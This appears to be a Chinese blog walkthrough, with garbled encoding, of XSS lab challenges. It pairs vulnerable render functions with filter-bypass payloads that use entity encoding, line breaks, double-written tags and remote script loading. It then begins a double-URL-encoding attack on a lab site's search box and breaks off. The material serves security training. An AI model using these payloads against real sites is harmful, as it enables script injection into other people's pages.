class="headerlink" title="9.é¶åœºç»ƒä¹ "></a>9.é¶åœºç»ƒä¹ </h2><h3 id="1-XSSé¶åœº1-haozi"><a href="#1-XSSé¶åœº1-haozi" class="headerlink" title="1.XSSé¶åœº1-haozi"></a>1.XSSé¶åœº1-haozi</h3><h4 id="0x00-ç›´æ¥scriptæ ‡ç­¾"><a href="#0x00-ç›´æ¥scriptæ ‡ç­¾" class="headerlink" title="0x00 -ç›´æ¥scriptæ ‡ç­¾"></a>0x00 -ç›´æ¥scriptæ ‡ç­¾</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x01-åŒæ ‡ç­¾ä¸­é—´è¾“å…¥-é—­åˆåŒæ ‡ç­¾"><a href="#0x01-åŒæ ‡ç­¾ä¸­é—´è¾“å…¥-é—­åˆåŒæ ‡ç­¾" class="headerlink" title="0x01 -åŒæ ‡ç­¾ä¸­é—´è¾“å…¥-é—­åˆåŒæ ‡ç­¾"></a>0x01 -åŒæ ‡ç­¾ä¸­é—´è¾“å…¥-é—­åˆåŒæ ‡ç­¾</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/textarea&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure><h4 id="0x02-å•æ ‡ç­¾è¾“å…¥-é—­åˆå•æ ‡ç­¾"><a href="#0x02-å•æ ‡ç­¾è¾“å…¥-é—­åˆå•æ ‡ç­¾" class="headerlink" title="0x02 - å•æ ‡ç­¾è¾“å…¥-é—­åˆå•æ ‡ç­¾"></a>0x02 - å•æ ‡ç­¾è¾“å…¥-é—­åˆå•æ ‡ç­¾</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x03-è¿‡æ»¤åœ†æ‹¬å·-åå¼•å·æ›¿ä»£æ‹¬å·"><a href="#0x03-è¿‡æ»¤åœ†æ‹¬å·-åå¼•å·æ›¿ä»£æ‹¬å·" class="headerlink" title="0x03 - è¿‡æ»¤åœ†æ‹¬å·-åå¼•å·æ›¿ä»£æ‹¬å·"></a>0x03 - è¿‡æ»¤åœ†æ‹¬å·-åå¼•å·æ›¿ä»£æ‹¬å·</h4><p>åŒ¹é…å»é™¤ï¼ˆï¼‰<br>å¯ä»¥ç”¨åå¼•å·æ›¿æ¢æ‹¬å·</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x04-è¿‡æ»¤æ‹¬å·-åå¼•å·-svgå®ä½“å­—ç¬¦ç¼–ç "><a href="#0x04-è¿‡æ»¤æ‹¬å·-åå¼•å·-svgå®ä½“å­—ç¬¦ç¼–ç " class="headerlink" title="0x04 -è¿‡æ»¤æ‹¬å·+åå¼•å· svgå®ä½“å­—ç¬¦ç¼–ç "></a>0x04 -è¿‡æ»¤æ‹¬å·+åå¼•å· svgå®ä½“å­—ç¬¦ç¼–ç </h4><p>åŒ¹é…æ‹¬å·å’Œåå¼•å·ï¼Œç”¨svgå®ä½“å­—ç¬¦ç¼–ç <br>ç¼–ç å¯ä»¥æ‰¾gpt</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure><h4 id="0x05-â€“-gt-é—­åˆæ³¨é‡Š"><a href="#0x05-â€“-gt-é—­åˆæ³¨é‡Š" class="headerlink" title="0x05 â€“!&gt;é—­åˆæ³¨é‡Š"></a>0x05 â€“!&gt;é—­åˆæ³¨é‡Š</h4><p>å¯ä»¥ç”¨â€“!&gt;æ³¨é‡Š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;ğŸ˜‚&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x06-é€šè¿‡æ¢è¡Œé€ƒé€¸æ­£åˆ™è¡¨è¾¾å¼é€ƒé€¸"><a href="#0x06-é€šè¿‡æ¢è¡Œé€ƒé€¸æ­£åˆ™è¡¨è¾¾å¼é€ƒé€¸" class="headerlink" title="0x06 - é€šè¿‡æ¢è¡Œé€ƒé€¸æ­£åˆ™è¡¨è¾¾å¼é€ƒé€¸"></a>0x06 - é€šè¿‡æ¢è¡Œé€ƒé€¸æ­£åˆ™è¡¨è¾¾å¼é€ƒé€¸</h4><p>æ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…ä¸€è¡Œ<br>å±è”½autoå’Œonå¼€å¤´æ¥ä¸Š&#x3D;åœ¨ä¸€è¡Œçš„å†…å®¹</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><h4 id="0x07-å•æ ‡ç­¾å¯ä»¥ä¸å†™å³æ ‡ç­¾"><a href="#0x07-å•æ ‡ç­¾å¯ä»¥ä¸å†™å³æ ‡ç­¾" class="headerlink" title="0x07 - å•æ ‡ç­¾å¯ä»¥ä¸å†™å³æ ‡ç­¾"></a>0x07 - å•æ ‡ç­¾å¯ä»¥ä¸å†™å³æ ‡ç­¾</h4><p>æ‰€æœ‰å•æ ‡ç­¾å¯ä»¥åªå†™å·¦æ ‡ç­¾ï¼Œä¸å†™å³æ ‡ç­¾</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=â€œalert(1)&quot;</span><br></pre></td></tr></table></figure><h4 id="0x08-æ ‡ç­¾æ¢è¡Œé€ƒé¿æ­£åˆ™è¡¨è¾¾å¼"><a href="#0x08-æ ‡ç­¾æ¢è¡Œé€ƒé¿æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="0x08 - æ ‡ç­¾æ¢è¡Œé€ƒé¿æ­£åˆ™è¡¨è¾¾å¼"></a>0x08 - æ ‡ç­¾æ¢è¡Œé€ƒé¿æ­£åˆ™è¡¨è¾¾å¼</h4><p>å‰ç«¯æ ‡ç­¾çš„æ‹¬å·å¯ä»¥æ¢è¡Œå†™</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (src) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="0x09-å­˜åœ¨æŒ‡å®šå†…å®¹çš„é—­åˆ"><a href="#0x09-å­˜åœ¨æŒ‡å®šå†…å®¹çš„é—­åˆ" class="headerlink" title="0x09 - å­˜åœ¨æŒ‡å®šå†…å®¹çš„é—­åˆ"></a>0x09 - å­˜åœ¨æŒ‡å®šå†…å®¹çš„é—­åˆ</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.segmentfault.com&quot; onload=&quot;alert(1)</span><br><span class="line">http://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;img src=x onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>0x0A-C å‡ºä¸æ¥ç»“æœï¼Œç°ä»£çš„æµè§ˆå™¨ä¸€èˆ¬éƒ½ä¸å…è®¸è¿™ç§è¯­æ³•</p><h4 id="0x0A-è¿œç¨‹JS"><a href="#0x0A-è¿œç¨‹JS" class="headerlink" title="0x0A - @è¿œç¨‹JS"></a>0x0A - @è¿œç¨‹JS</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.segmentfault.com@http://127.0.0.1/abc.js</span></span><br></pre></td></tr></table></figure><h4 id="0x0B-å¤§å†™è¿œç¨‹JS"><a href="#0x0B-å¤§å†™è¿œç¨‹JS" class="headerlink" title="0x0B -@ å¤§å†™è¿œç¨‹JS"></a>0x0B -@ å¤§å†™è¿œç¨‹JS</h4><p>æ‰€æœ‰è¾“å…¥çš„å†…å®¹éƒ½å˜æˆå¤§å†™-é€šè¿‡è¿œç¨‹é“¾æ¥åˆ°JS</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.segmentfault.com@http://127.0.0.1/ABC.JS</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&#x27;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span>(1)&#x27;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="0x0C-åŒå†™-å¤§å†™-è¿œç¨‹"><a href="#0x0C-åŒå†™-å¤§å†™-è¿œç¨‹" class="headerlink" title="0x0C - åŒå†™+å¤§å†™+è¿œç¨‹"></a>0x0C - åŒå†™+å¤§å†™+è¿œç¨‹</h4><p>å¤§å†™åå±è”½scriptæ ‡ç­¾<br>åŒå†™ç»•è¿‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scriscriptpt src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0D-å¤šæ¬¡æ¢è¡Œé€ƒé€¸"><a href="#0x0D-å¤šæ¬¡æ¢è¡Œé€ƒé€¸" class="headerlink" title="0x0D å¤šæ¬¡æ¢è¡Œé€ƒé€¸"></a>0x0D å¤šæ¬¡æ¢è¡Œé€ƒé€¸</h4><p>å±è”½&lt; &#x2F; â€œ â€˜</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xxxxx</span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0E-é•¿è‹±è¯­é€ƒé€¸"><a href="#0x0E-é•¿è‹±è¯­é€ƒé€¸" class="headerlink" title="0x0E -é•¿è‹±è¯­é€ƒé€¸"></a>0x0E -é•¿è‹±è¯­é€ƒé€¸</h4><p>&lt;åå¦‚æœæ˜¯å­—æ¯åŠ ä¸€ä¸ª_<br>å¦‚æœç›®æ ‡æŠŠæˆ‘ä»¬æ‰€æœ‰çš„è¾“å…¥éƒ½å¤§å†™äº†ï¼Œå°±ä¸å¯ä»¥ç”¨jsè¯­æ³•åŠ›ï¼Œjsè¯­æ³•å¤§å°å†™æ•æ„Ÿï¼Œä½†æ˜¯jsæ ‡ç­¾å¤§å°éšæ„.<br>è¾“å…¥çš„é•¿è‹±è¯­ç»è¿‡å¤§å†™åå˜æˆå¤§å†™S</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Å¿cript src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;Å¿vg/onload=&#x27;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&#x27;&gt;</span><br></pre></td></tr></table></figure><h4 id="0x0F-imgæ ‡ç­¾å†—ä½™"><a href="#0x0F-imgæ ‡ç­¾å†—ä½™" class="headerlink" title="0x0F -imgæ ‡ç­¾å†—ä½™;"></a>0x0F -imgæ ‡ç­¾å†—ä½™;</h4><p>é€‚ç”¨äºæ—§ç‰ˆæœ¬æµè§ˆå™¨</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);alert(1)//</span><br></pre></td></tr></table></figure><h4 id="0x10-jså¯ä»¥æ¢è¡Œä¸åŠ åˆ†å·"><a href="#0x10-jså¯ä»¥æ¢è¡Œä¸åŠ åˆ†å·" class="headerlink" title="0x10-jså¯ä»¥æ¢è¡Œä¸åŠ åˆ†å·"></a>0x10-jså¯ä»¥æ¢è¡Œä¸åŠ åˆ†å·</h4><p>jsæ¢è¡Œä¸åŠ åˆ†å·ä¹Ÿè¡Œ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">213</span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure><h4 id="0x11-é—­åˆ-æ³¨é‡Š"><a href="#0x11-é—­åˆ-æ³¨é‡Š" class="headerlink" title="0x11-é—­åˆ+æ³¨é‡Š"></a>0x11-é—­åˆ+æ³¨é‡Š</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (s) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeJs</span> (s) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>(s)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xx&quot;);alert(1);//</span><br></pre></td></tr></table></figure><h4 id="0x12-é—­åˆ-æ³¨é‡Š"><a href="#0x12-é—­åˆ-æ³¨é‡Š" class="headerlink" title="0x12 - é—­åˆ+æ³¨é‡Š"></a>0x12 - é—­åˆ+æ³¨é‡Š</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (s) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&quot;);alert(1);</span><br><span class="line">//</span><br></pre></td></tr></table></figure><h3 id="2-chuanzhi7é¶åœº"><a href="#2-chuanzhi7é¶åœº" class="headerlink" title="2.chuanzhi7é¶åœº"></a>2.chuanzhi7é¶åœº</h3><p><a href="http://chanzhi7.njhack.xyz/www/">http://chanzhi7.njhack.xyz/www/</a></p><p>å°è¯•å¯¹æœç´¢æ¡†è¿›è¡ŒXSSæ¼æ´æŒ–æ˜<br>é¦–å…ˆå³é”®æŸ¥çœ‹é¡µé¢æºç ï¼Œæ‰¾åˆ°æ³¨å…¥ç‚¹</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;words&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;words&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;[æ³¨å…¥ç‚¹]&#x27;</span> <span class="attr">class</span>=<span class="string">&#x27;form-control&#x27;</span> <span class="attr">placeholder</span>=<span class="string">&#x27;&#x27;</span> /&gt;</span> </span><br><span class="line">http://chanzhi7.njhack.xyz/www/index.php/search-index-[æ³¨å…¥ç‚¹]1.html</span><br></pre></td></tr></table></figure><p>æƒ³è¦å¯¹å…¶è¿›è¡Œé—­åˆæ³¨å…¥ç­‰ï¼Œä½†æ˜¯ç»å®éªŒå‘ç°ç¯å¢ƒå¯¹&lt;&gt;â€ç­‰éƒ½æœ‰å±è”½, å°è¯•è¿›è¡Œç¼–ç ï¼Œçœ‹çœ‹ç¼–ç åç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;words&#x27; id=&#x27;words&#x27; value=&#x27;  x&#x27;&gt;&lt;img                             </span><br><span class="line">&#x27; class=&#x27;form-control&#x27; placeholder=&#x27;&#x27; /&gt; </span><br></pre></td></tr></table></figure><p>è¿›è¡Œä¸€æ¬¡ç¼–ç å,ç»“æœæ—¶Bad Request</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chanzhi7.njhack.xyz/www/index.php/search-index-%78%27%3e%3c%69%6d%67-1.html</span><br><span class="line">http://chanzhi7.njhack.xyz/www/index.php/search-index-x&#x27;&gt;&lt;img-1.html</span><br></pre></td></tr></table></figure><p>è¿›è¡Œç¬¬äºŒæ¬¡ç¼–ç åï¼Œå‘ç°æ­£å¸¸ï¼Œå¾—çŸ¥æˆ‘ä»¬éœ€è¦2æ¬¡ç¼–ç 